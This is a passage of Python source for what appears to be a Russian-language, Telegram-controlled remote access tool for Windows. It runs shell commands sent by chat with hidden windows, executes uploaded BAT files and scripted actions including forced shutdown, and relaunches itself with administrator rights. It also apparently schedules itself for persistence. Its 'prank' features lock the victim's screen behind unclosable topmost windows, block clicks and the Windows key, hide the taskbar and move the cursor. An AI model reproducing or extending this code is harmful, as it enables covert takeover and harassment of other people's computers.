root.overrideredirect(True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
img = Image.open('{image_path}')
img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
photo = ImageTk.PhotoImage(image=img)
label = tk.Label(root, image=photo)
label.pack()
root.mainloop()
"""], creationflags=subprocess.CREATE_NO_WINDOW)
        
        with open("fullscreen_image_pid.txt", "w") as f:
            f.write(str(process.pid))
    except Exception as e:
        handle_error(e, "отображении фото на весь экран")

@bot.callback_query_handler(func=lambda call: call.data == "close_photo")
def close_photo(call):
    try:
        if os.path.exists("fullscreen_image_pid.txt"):
            with open("fullscreen_image_pid.txt", "r") as f:
                pid = int(f.read().strip())
            os.kill(pid, 9)
            os.remove("fullscreen_image_pid.txt")
        if os.path.exists("fullscreen_image.jpg"):
            os.remove("fullscreen_image.jpg")
        bot.answer_callback_query(call.id, "Фото закрыто")
    except Exception as e:
        handle_error(e, "закрытии фото")

@bot.message_handler(func=lambda message: message.text == "😂 Шутки")
def pranks_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Переворот экрана", callback_data="prank:rotate"))
        markup.add(types.InlineKeyboardButton("Искажение экрана", callback_data="prank:distort"))
        markup.add(types.InlineKeyboardButton("Инверсия цвета", callback_data="prank:invert"))
        markup.add(types.InlineKeyboardButton("Смайлики DVD", callback_data="prank:smiles"))
        markup.add(types.InlineKeyboardButton("Телепортация курсора", callback_data="prank:cursor"))
        markup.add(types.InlineKeyboardButton("Скрыть панель задач", callback_data="prank:hide_taskbar"))
        markup.add(types.InlineKeyboardButton("Случайное перемещение окон", callback_data="prank:move_windows"))
        markup.add(types.InlineKeyboardButton("Говорящий ПК", callback_data="prank:speak"))
        markup.add(types.InlineKeyboardButton("Эффект заморозки", callback_data="prank:freeze"))
        markup.add(types.InlineKeyboardButton("Назад", callback_data="back:fun"))
        bot.send_message(message.chat.id, "Шутки:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню шуток")

@bot.callback_query_handler(func=lambda call: call.data.startswith("prank:"))
def prank_callback(call):
    try:
        if not check_id(call.message):
            return
        prank_type = call.data.split(":")[1]
        global prank_active, prank_threads
        prank_active = True
        block_windows()  # Блокируем клавишу Windows при запуске шутки

        def rotate_screen():
            try:
                if not prank_active:
                    return
                with mss() as sct:
                    screenshot = sct.grab(sct.monitors[0])
                    img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                rotated_img = img.rotate(180)
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.overrideredirect(True)
                root.protocol("WM_DELETE_WINDOW", lambda: None)
                root.bind("<Button-1>", lambda event: "break")  # Блокируем клики мыши
                root.bind("<Button-3>", lambda event: "break")  # Блокируем правый клик
                photo = ImageTk.PhotoImage(image=rotated_img)
                label = tk.Label(root, image=photo)
                label.pack()
                bot.answer_callback_query(call.id, "Экран перевёрнут!")
                root.update()
                while prank_active:
                    time.sleep(1)
                root.destroy()
            except Exception as e:
                handle_error(e, "перевороте экрана")

        def distort_screen():
            try:
                if not prank_active:
                    return
                with mss() as sct:
                    screenshot = sct.grab(sct.monitors[0])
                    img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.overrideredirect(True)
                root.protocol("WM_DELETE_WINDOW", lambda: None)
                root.bind("<Button-1>", lambda event: "break")
                root.bind("<Button-3>", lambda event: "break")
                canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), highlightthickness=0)
                canvas.pack()
                bot.answer_callback_query(call.id, "Экран искажён!")
                img_array = np.array(img)
                original_img_array = img_array.copy()
                height, width = img_array.shape[:2]
                last_reset_time = time.time()
                last_zoom_time = time.time()
                zoom_scale = 1.0  # Начинаем с нормального масштаба
                zoom_images = []
                while prank_active:
                    current_time = time.time()
                    # Частичный сброс шума каждые 10 секунд
                    if current_time - last_reset_time >= 10:
                        # Смешиваем текущее изображение с исходным (50% на 50%)
                        img_array = (img_array.astype(np.float32) * 0.5 + original_img_array.astype(np.float32) * 0.5).astype(np.uint8)
                        last_reset_time = current_time
                        # Не сбрасываем zoom_images и zoom_scale
                    # Разрывы (сдвиги строк)
                    for i in range(0, height, 20):
                        shift = random.randint(-50, 50)
                        img_array[i:i+20, :, :] = np.roll(img_array[i:i+20, :, :], shift, axis=1)
                    # Случайные глитч-эффекты
                    if random.random() < 0.5:
                        noise = np.random.randint(-50, 50, img_array.shape, dtype=np.int16)
                        img_array = np.clip(img_array.astype(np.int16) + noise, 0, 255).astype(np.uint8)
                    if random.random() < 0.3:
                        y_start = random.randint(0, height - 100)
                        x_start = random.randint(0, width - 100)
                        block = img_array[y_start:y_start+100, x_start:x_start+100, :]
                        img_array[y_start:y_start+100, x_start:x_start+100, :] = 255 - block
                    if random.random() < 0.2:
                        channel = random.choice([0, 1, 2])
                        img_array[:, :, channel] = np.clip(img_array[:, :, channel].astype(np.int16) + random.randint(-30, 30), 0, 255).astype(np.uint8)
                    # Новые прикольные эффекты
                    if random.random() < 0.1:  # 10% шанс на эффект "битого экрана"
                        for _ in range(random.randint(1, 5)):
                            y = random.randint(0, height - 1)
                            img_array[y:y+2, :, :] = np.random.randint(0, 255, (2, width, 3), dtype=np.uint8)
                    if random.random() < 0.15:  # 15% шанс на эффект "полосы"
                        for _ in range(random.randint(1, 3)):
                            x_start = random.randint(0, width - 50)
                            y_start = random.randint(0, height - 50)
                            color = np.random.randint(0, 255, 3, dtype=np.uint8)
                            img_array[y_start:y_start+50, x_start:x_start+5, :] = color
                    if random.random() < 0.1:  # 10% шанс на эффект "цветового сдвига"
                        channel_shift = random.randint(-20, 20)
                        channel = random.choice([0, 1, 2])
                        img_array[:, :, channel] = np.roll(img_array[:, :, channel], channel_shift, axis=1)
                    # Эффект туннеля (уменьшение масштаба каждую секунду)
                    if current_time - last_zoom_time >= 1:
                        zoom_scale *= 0.9  # Уменьшаем масштаб (создаём эффект туннеля)
                        if zoom_scale < 0.1:  # Ограничиваем минимальный масштаб
                            zoom_scale = 0.1
                        zoomed_img = Image.fromarray(img_array).resize(
                            (int(width * zoom_scale), int(height * zoom_scale)), Image.Resampling.LANCZOS
                        )
                        zoomed_img_array = np.array(zoomed_img)
                        zoomed_height, zoomed_width = zoomed_img_array.shape[:2]
                        offset_x = (width - zoomed_width) // 2
                        offset_y = (height - zoomed_height) // 2
                        zoom_images.append((zoomed_img_array, offset_x, offset_y))
                        last_zoom_time = current_time
                    # Отрисовка основного изображения
                    distorted_img = Image.fromarray(img_array)
                    photo = ImageTk.PhotoImage(image=distorted_img)
                    canvas.create_image(0, 0, image=photo, anchor="nw")
                    # Отрисовка "отдаляющихся" копий с прозрачностью
                    for zoomed_img_array, offset_x, offset_y in zoom_images:
                        zoomed_img = Image.fromarray(zoomed_img_array)
                        zoomed_img.putalpha(int(255 * (zoom_scale / 1.0)))  # Прозрачность зависит от масштаба
                        zoomed_photo = ImageTk.PhotoImage(image=zoomed_img)
                        canvas.create_image(offset_x, offset_y, image=zoomed_photo, anchor="nw")
                        canvas.zoomed_photo = zoomed_photo
                    root.update()
                    time.sleep(0.2)
                    canvas.delete("all")
                root.destroy()
            except Exception as e:
                handle_error(e, "искажении экрана")

        def invert_colors():
            try:
                if not prank_active:
                    return
                with mss() as sct:
                    screenshot = sct.grab(sct.monitors[0])
                    img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                img_inverted = Image.eval(img, lambda x: 255 - x)
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.overrideredirect(True)
                root.protocol("WM_DELETE_WINDOW", lambda: None)
                root.bind("<Button-1>", lambda event: "break")
                root.bind("<Button-3>", lambda event: "break")
                photo = ImageTk.PhotoImage(image=img_inverted)
                label = tk.Label(root, image=photo)
                label.pack()
                bot.answer_callback_query(call.id, "Цвета инвертированы!")
                root.update()
                while prank_active:
                    time.sleep(1)
                root.destroy()
            except Exception as e:
                handle_error(e, "инверсии цвета")

        def dvd_smiles():
            try:
                if not prank_active:
                    return
                windows = []
                for _ in range(5):
                    root = tk.Tk()
                    root.overrideredirect(True)
                    root.attributes('-topmost', True)
                    root.attributes('-transparentcolor', 'black')
                    root.configure(bg='black')
                    smile = random.choice(["😀", "😁", "😂", "🤓", "😎"])
                    label = tk.Label(root, text=smile, font=("Arial", 50), bg="black", fg="yellow")
                    label.pack()
                    dx = random.randint(5, 10) * random.choice([-1, 1])
                    dy = random.randint(5, 10) * random.choice([-1, 1])
                    x = random.randint(0, root.winfo_screenwidth() - 100)
                    y = random.randint(0, root.winfo_screenheight() - 100)
                    root.geometry(f"100x100+{x}+{y}")
                    windows.append((root, label, dx, dy, x, y))
                    root.update()
                bot.answer_callback_query(call.id, "Смайлики DVD запущены!")
                while prank_active:
                    for i, (root, label, dx, dy, x, y) in enumerate(windows):
                        x += dx
                        y += dy
                        screen_width = root.winfo_screenwidth()
                        screen_height = root.winfo_screenheight()
                        if x <= 0 or x >= screen_width - 100:
                            dx = -dx
                        if y <= 0 or y >= screen_height - 100:
                            dy = -dy
                        root.geometry(f"100x100+{int(x)}+{int(y)}")
                        root.update()
                        windows[i] = (root, label, dx, dy, x, y)
                    time.sleep(0.05)
                for root, _, _, _, _, _ in windows:
                    root.destroy()
            except Exception as e:
                handle_error(e, "анимации смайликов DVD")

        def freeze_effect():
            try:
                if not prank_active:
                    return
                with mss() as sct:
                    screenshot = sct.grab(sct.monitors[0])
                    img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.overrideredirect(True)
                root.protocol("WM_DELETE_WINDOW", lambda: None)
                root.bind("<Button-1>", lambda event: "break")
                root.bind("<Button-3>", lambda event: "break")
                photo = ImageTk.PhotoImage(image=img)
                label = tk.Label(root, image=photo)
                label.pack()
                bot.answer_callback_query(call.id, "Экран заморожен!")
                root.update()
                while prank_active:
                    time.sleep(1)
                root.destroy()
            except Exception as e:
                handle_error(e, "эффекте заморозки")

        def teleport_cursor():
            try:
                if not prank_active:
                    return
                bot.answer_callback_query(call.id, "Курсор телепортируется!")
                while prank_active:
                    x = random.randint(0, 1920)
                    y = random.randint(0, 1080)
                    ctypes.windll.user32.SetCursorPos(x, y)
                    time.sleep(0.5)
            except Exception as e:
                handle_error(e, "телепортации курсора")

        def speak_random_phrases():
            try:
                if not prank_active:
                    return
                phrases = [
                    "Привет, я твой компьютер!",
                    "Не трогай меня, я занят!",
                    "Ты сегодня хорошо выглядишь!",
                    "Давай поиграем в игру?",
                    "Я слежу за тобой!",
                    "Хватит нажимать на клавиши!",
                    "Мне скучно, развлеки меня!",
                    "Ты забыл закрыть окно!",
                    "Я знаю, что ты делаешь!",
                    "Пора сделать перерыв!"
                ]
                engine = pyttsx3.init()
                bot.answer_callback_query(call.id, "ПК заговорил!")
                while prank_active:
                    engine.say(random.choice(phrases))
                    engine.runAndWait()
                    time.sleep(random.uniform(3, 10))
            except Exception as e:
                handle_error(e, "говорящем ПК")

        def move_windows():
            try:
                if not prank_active:
                    return
                bot.answer_callback_query(call.id, "Окна перемещены!")
                while prank_active:
                    hwnd = ctypes.windll.user32.GetForegroundWindow()
                    if hwnd:
                        x = random.randint(0, 1000)
                        y = random.randint(0, 600)
                        ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0001)
                    time.sleep(0.5)
            except Exception as e:
                handle_error(e, "перемещении окон")

        prank_functions = {
            "rotate": rotate_screen,
            "distort": distort_screen,
            "invert": invert_colors,
            "smiles": dvd_smiles,
            "freeze": freeze_effect,
            "cursor": teleport_cursor,
            "hide_taskbar": lambda: [ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 0), bot.answer_callback_query(call.id, "Панель задач скрыта!"), [time.sleep(1) for _ in iter(lambda: prank_active, False)], ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 1) if prank_active else None],
            "move_windows": move_windows,
            "speak": speak_random_phrases
        }

        if prank_type in prank_functions:
            thread = threading.Thread(target=prank_functions[prank_type], daemon=True)
            prank_threads.append(thread)
            thread.start()
        else:
            bot.answer_callback_query(call.id, "Неизвестная шутка")
    except Exception as e:
        handle_error(e, "обработке шутки")

@bot.message_handler(func=lambda message: message.text == "⛔ Остановить шутки")
def stop_pranks(message):
    try:
        if not check_id(message):
            return
        global prank_active, prank_threads, input_blocked, sound_playing
        prank_active = False
        input_blocked = False
        sound_playing = False  # Останавливаем воспроизведение звука
        unblock_windows()
        pyautogui.FAILSAFE = True
        for thread in prank_threads:
            thread.join(timeout=1)
        prank_threads.clear()
        # Останавливаем звук, если он воспроизводится через winsound
        winsound.PlaySound(None, 0)
        # Удаляем временные файлы, если они существуют
        for temp_file in ["temp_audio.mp3", "temp_audio.wav"]:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        bot.send_message(message.chat.id, "Все шутки остановлены, блокировка ввода отключена, звук остановлен.")
    except Exception as e:
        handle_error(e, "остановке шуток")

# Чат
@bot.message_handler(func=lambda message: message.text == "💬 Чат")
def chat_command(message):
    try:
        if not check_id(message):
            return
        global chat_active
        if chat_active:
            bot.send_message(message.chat.id, "Чат уже открыт")
            return

        chat_active = True
        threading.Thread(target=open_chat, args=(message.chat.id,), daemon=True).start()
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Закрыть чат", callback_data="close_chat"))
        bot.send_message(message.chat.id, "Чат открыт. Нажми, чтобы закрыть:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "открытии чата")

def open_chat(chat_id):
    global chat_window, chat_active
    try:
        create_overlay()
        ctk.set_appearance_mode("dark")
        chat_window = ctk.CTk()
        chat_window.attributes('-fullscreen', True)
        chat_window.attributes('-topmost', True)
        chat_window.overrideredirect(True)
        chat_window.protocol("WM_DELETE_WINDOW", lambda: None)

        title_label = ctk.CTkLabel(chat_window, text="💬 ЧАТ", font=("Arial", 20, "bold"))
        title_label.pack(pady=10)

        chat_frame = ctk.CTkFrame(chat_window)
        chat_frame.pack(expand=True, fill="both", padx=20, pady=10)
        chat_text = ctk.CTkTextbox(chat_frame, font=("Arial", 14), wrap="word", height=300)
        chat_text.pack(expand=True, fill="both")

        input_frame = ctk.CTkFrame(chat_window)
        input_frame.pack(fill="x", padx=20, pady=10)
        input_field = ctk.CTkEntry(input_frame, font=("Arial", 14), placeholder_text="Введите сообщение...")
        input_field.pack(side="left", fill="x", expand=True, padx=(0, 10))
        send_button = ctk.CTkButton(input_frame, text="Отправить", font=("Arial", 14), command=lambda: send_chat_message(chat_id, input_field.get(), chat_text))
        send_button.pack(side="right")

        def send_chat_message(chat_id, text, chat_widget):
            if text.strip():
                bot.send_message(chat_id, text)
                chat_widget.insert("end", f"Вы: {text}\n")
                chat_widget.see("end")
                input_field.delete(0, "end")

        chat_window.mainloop()
    except Exception as e:
        handle_error(e, "работе с чатом")
        chat_active = False
        destroy_overlay()

@bot.message_handler(func=lambda message: message.text not in ["💬 Чат", "📷 Скриншоты", "📹 Веб-камера", "🖱 Мышка", "📂 Файлы", "🖥 Система", "📺 Процессы", "🔧 Автозагрузка", "📩 Уведомления", "🔊 Громкость", "📡 Стриминг", "🎉 Веселье", "📜 Сценарии", "Назад", "⚙️ Админ", "🔄 Перезапуск", "🔄 Обновить бота", "💥 BSOD"])
def handle_chat_message(message):
    try:
        if not check_id(message) or not chat_active or not chat_window:
            return
        chat_text = chat_window.winfo_children()[1].winfo_children()[0]
        chat_text.insert("end", f"Получено: {message.text}\n")
        chat_text.see("end")
    except Exception as e:
        handle_error(e, "обработке сообщения чата")

@bot.callback_query_handler(func=lambda call: call.data == "close_chat")
def close_chat(call):
    try:
        global chat_window, chat_active
        if chat_window and chat_active:
            chat_window.destroy()
            chat_window = None
            chat_active = False
            destroy_overlay()
        bot.answer_callback_query(call.id, "Чат закрыт")
        if os.path.exists("fullscreen_image_pid.txt"):
            os.remove("fullscreen_image_pid.txt")
    except Exception as e:
        handle_error(e, "закрытии чата")

# Сценарии
scenarios = {}

@bot.message_handler(func=lambda message: message.text == "📜 Сценарии")
def scenario_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("➕ Создать", "▶️ Запустить", "⬅️ Назад")
        bot.send_message(message.chat.id, "Сценарии:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "меню сценариев")

@bot.message_handler(func=lambda message: message.text == "➕ Создать")
def create_scenario(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "Отправь имя сценария")
        bot.register_next_step_handler(message, lambda msg: start_scenario_creation(msg))
    except Exception as e:
        handle_error(e, "создании сценария")

def start_scenario_creation(message):
    try:
        name = message.text
        scenarios[name] = []
        commands = (
            "Доступные команды:\n"
            "- screenshot (быстрый скриншот)\n"
            "- shutdown (выключить ПК)\n"
            "- cmd:команда (выполнить CMD)\n"
            "- bat:путь (запустить BAT)\n"
            "- run:путь (запустить файл)\n"
            "Отправь действия по одному в формате: команда - описание (или просто команда). Заверши словом 'готово'."
        )
        bot.send_message(message.chat.id, commands)
        bot.register_next_step_handler(message, lambda msg: add_scenario_action(msg, name))
    except Exception as e:
        handle_error(e, "начале создания сценария")

def add_scenario_action(message, name):
    try:
        if message.text.lower() == "готово":
            bot.send_message(message.chat.id, f"Сценарий '{name}' создан")
            return
        scenarios[name].append(message.text)
        bot.send_message(message.chat.id, f"Добавлено: {message.text}. Продолжай или отправь 'готово'")
        bot.register_next_step_handler(message, lambda msg: add_scenario_action(msg, name))
    except Exception as e:
        handle_error(e, "добавлении действия в сценарий")

@bot.message_handler(func=lambda message: message.text == "▶️ Запустить")
def run_scenario(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        for name in scenarios:
            markup.add(types.InlineKeyboardButton(name, callback_data=f"run_scenario:{name}"))
        markup.add(types.InlineKeyboardButton("Назад", callback_data="back:scenarios"))
        bot.send_message(message.chat.id, "Выберите сценарий:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "запуске сценария")

@bot.callback_query_handler(func=lambda call: call.data.startswith("run_scenario:"))
def execute_scenario(call):
    try:
        name = call.data.split(":", 1)[1]
        for action in scenarios[name]:
            cmd = action.split(" - ")[0].strip()
            if cmd == "screenshot":
                quick_screenshot(call.message)
            elif cmd == "shutdown":
                os.system("shutdown /s /t 0")
            elif cmd.startswith("cmd:"):
                subprocess.run(cmd[4:], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            elif cmd.startswith("bat:"):
                subprocess.run(f'"{cmd[4:]}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            elif cmd.startswith("run:"):
                os.startfile(cmd[4:])
            time.sleep(1)
        bot.answer_callback_query(call.id, f"Сценарий '{name}' выполнен")
    except Exception as e:
        handle_error(e, "выполнении сценария")

# BAT и CMD
@bot.message_handler(content_types=['document'], func=lambda message: message.document.file_name.endswith(".bat"))
def run_bat(message):
    try:
        if not check_id(message):
            return
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bat_path = "temp.bat"
        with open(bat_path, "wb") as f:
            f.write(downloaded_file)
        subprocess.run(f'"{bat_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        os.remove(bat_path)
        bot.send_message(message.chat.id, "BAT-файл выполнен")
    except Exception as e:
        handle_error(e, "выполнении BAT-файла")

@bot.message_handler(func=lambda message: message.text.startswith("cmd:"))
def run_hidden_cmd(message):
    try:
        if not check_id(message):
            return
        cmd = message.text[4:]
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, "Команда выполнена скрытно")
    except Exception as e:
        handle_error(e, "выполнении скрытой команды")

# Обратные переходы
@bot.callback_query_handler(func=lambda call: call.data == "back:main")
def back_to_main(call):
    try:
        show_main_menu(call.message)
        bot.edit_message_text("Выберите действие:", call.message.chat.id, call.message.message_id, reply_markup=None)
    except Exception as e:
        handle_error(e, "возврате в главное меню")

@bot.callback_query_handler(func=lambda call: call.data == "back:processes")
def back_to_processes(call):
    try:
        processes_menu(call.message)
    except Exception as e:
        handle_error(e, "возврате в меню процессов")

@bot.callback_query_handler(func=lambda call: call.data == "back:fun")
def back_to_fun(call):
    try:
        fun_menu(call.message)
    except Exception as e:
        handle_error(e, "возврате в меню веселья")

@bot.callback_query_handler(func=lambda call: call.data == "back:scenarios")
def back_to_scenarios(call):
    try:
        scenario_menu(call.message)
    except Exception as e:
        handle_error(e, "возврате в меню сценариев")

@bot.message_handler(func=lambda message: message.text == "Назад")
def back_handler(message):
    try:
        show_main_menu(message)
    except Exception as e:
        handle_error(e, "возврате назад")

@bot.callback_query_handler(func=lambda call: call.data.startswith("back:"))
def back_callback(call):
    try:
        dest = call.data.split(":", 1)[1]
        if dest == "main":
            show_main_menu(call.message)
        else:
            markup = create_folder_keyboard(dest)
            bot.edit_message_text("Выберите папку или файл:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "возврате в папку")

def is_already_running():
    current_pid = os.getpid()
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.pid != current_pid and proc.name() == os.path.basename(sys.executable):
            return True
    return False

if __name__ == "__main__":
    if is_already_running():
        print("Экземпляр бота уже запущен. Завершаем...")
    try:
        if not is_admin():
            print("Бот требует прав администратора.")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
        else:
            print("Бот запущен с правами администратора.")
            threading.Thread(target=check_and_create_task, daemon=True).start()
            while True:
                try:
                    bot.polling(none_stop=True)
                except Exception as e:
                    handle_error(e, "основном цикле polling")
                    print("Произошла ошибка в polling, перезапускаем через 5 секунд...")
                    time.sleep(5)
    except Exception as e:
        handle_error(e, "основном цикле бота")
        print("Бот продолжает работу несмотря на ошибку в основном цикле")